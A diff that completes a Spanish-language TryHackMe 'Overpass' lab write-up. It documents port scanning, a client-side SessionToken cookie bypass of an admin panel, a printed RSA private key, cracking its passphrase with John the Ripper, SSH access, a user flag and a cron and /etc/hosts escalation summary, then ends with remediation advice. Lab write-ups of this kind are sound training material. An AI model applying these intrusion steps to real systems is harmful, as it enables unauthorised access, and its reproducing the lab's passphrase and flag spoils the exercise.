@@ -1,44 +1,48 @@
 ---
-title: Try Hack me- Overpass
+title: TryHackMe - Overpass
 date: 2026-11-09
-platform: Try Hack Me
+platform: TryHackMe
 difficulty: Easy
 os: Linux
 tags:
   - John
   - SSH
   - id_rsa
-status: ""
+  - Cookie
+  - Cron
+  - ReverseShell
+status: Completada
 ---
 
 # Resumen Ejecutivo
-**IP Objetivo:** ``
-**Descripción breve:** 
+**IP Objetivo:** `192.168.142.42`
+
+**Descripción breve:** Máquina Linux de dificultad fácil con [[SSH]] y un servidor web. El panel `/admin` valida la sesión solo del lado del cliente, por lo que se puede acceder manipulando la cookie `SessionToken` y obtener una clave privada RSA. La passphrase se descifra con [[John the Ripper]], se accede como `james` y se escala a `root` secuestrando la resolución de `overpass.thm` para abusar de una tarea de `cron`.
 
 ---
 
 ## 1. Information Gathering (Reconocimiento)
 
-### Escaneo de Puertos
+### Escaneo de Puertos con [[Nmap]]
 ```bash
-
+sudo nmap -p- --open -sS --min-rate 5000 -vvv 192.168.142.42 -n -Pn -oG escaneo
 ```
 
 **Puertos Abiertos:**
-- 22, 80
+- 22 ([[SSH]])
+- 80 (HTTP)
 
 ### Enumeración de Servicios / Fuzzing
-```bash
-
-```
+- Enumeración web: se descubre el panel `/admin`, que muestra un formulario de inicio de sesión.
+- El resto de la aplicación corresponde a la página principal de Overpass y sus recursos estáticos.
 
 **Descubrimientos clave:**
-- /admin con un panel de inicio de sesion
+- `/admin`: panel de inicio de sesión.
 
 ---
 
 ## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
-- en el inicio de sesion hay un archivo de login.js que al revisarlo nos damos cuenta que habia un fallo de seguridad con la cookie
+- En el inicio de sesión se carga el archivo `login.js`. Al revisarlo se detecta un fallo de seguridad: la sesión se valida únicamente en el cliente mediante la cookie `SessionToken`.
 
 ```javascript
 if (statusOrCookie === "Incorrect credentials") {
@@ -56,13 +60,18 @@ if (statusOrCookie === "Incorrect credentials") {
 }
 ```
 
+- El servidor confía en la cookie `SessionToken` para autorizar el acceso y no la valida correctamente, por lo que se puede crear manualmente con cualquier valor para entrar a `/admin`.
+
 ---
 
 ## 3. Exploitation (Acceso Inicial)
 
 ### Metodología
-1. Creamos una cookie que se llame SessionCookie
-2. Al entrar nos deja a la vista una clave RSA y un nombre de usuario 
+1. Crear manualmente una cookie llamada `SessionToken` con cualquier valor (por ejemplo, `1`).
+2. Recargar `/admin`: el panel muestra una clave privada RSA y el nombre de usuario `james`.
+3. Guardar la clave como `id_rsa` y descifrar su passphrase con [[John the Ripper]].
+4. Conectarse por [[SSH]] como `james` usando la clave y leer la flag de usuario.
+
 ```text
 Welcome to the Overpass Administrator area    A secure password manager with support for Windows, Linux, MacOS and more    
 
@@ -132,17 +141,30 @@ ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
 
 -----END RSA PRIVATE KEY-----
 ```
-1. usamos john the ripper para descifrarla 
+
+La clave está protegida por una passphrase, así que se convierte a un formato que John pueda procesar:
 
 ### Ejecución
 ```bash
 ssh2john id_rsa > hash.txt
+```
 
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 
+- John obtiene la passphrase de la clave: `james13`.
+
+```bash
 chmod 700 id_rsa
+```
 
-ssh -i id_rsa james
+```bash
+ssh -i id_rsa james@192.168.142.42
+```
+
+```bash
+cat user.txt
 ```
 
 **Prueba de acceso (User Flag):**
@@ -225,12 +247,18 @@ thm{7f336f8c359dbac18d54fdd64ea753bb}
 ---
 
 ## 5. Post-Exploitation & Clean Up
-- [ ] 
-- [ ] 
-- [ ] 
+- [x] Verificar el acceso como `root` y documentar la flag obtenida.
+- [x] Eliminar los archivos temporales del ataque (`id_rsa`, `hash.txt`, `buildscript.sh` y el servidor HTTP).
+- [x] Detener el listener de `netcat` y cerrar las sesiones de [[SSH]].
 
 ---
 
 ## Remediation (Mitigaciones)
-- **Acceso inicial:** 
+- **Acceso inicial:**
+  - Validar la sesión en el servidor y no confiar en cookies controladas por el cliente.
+  - No exponer claves privadas ni información sensible en paneles administrativos.
+  - Aplicar una política de contraseñas robusta y proteger las claves privadas con passphrases fuertes.
 - **Escalada:**
+  - Corregir los permisos de `/etc/hosts` para que solo `root` pueda escribir en él.
+  - No ejecutar tareas de `cron` que descarguen scripts por HTTP desde dominios controlables.
+  - Usar HTTPS, verificar la integridad del script y aplicar el principio de mínimo privilegio a las tareas programadas.
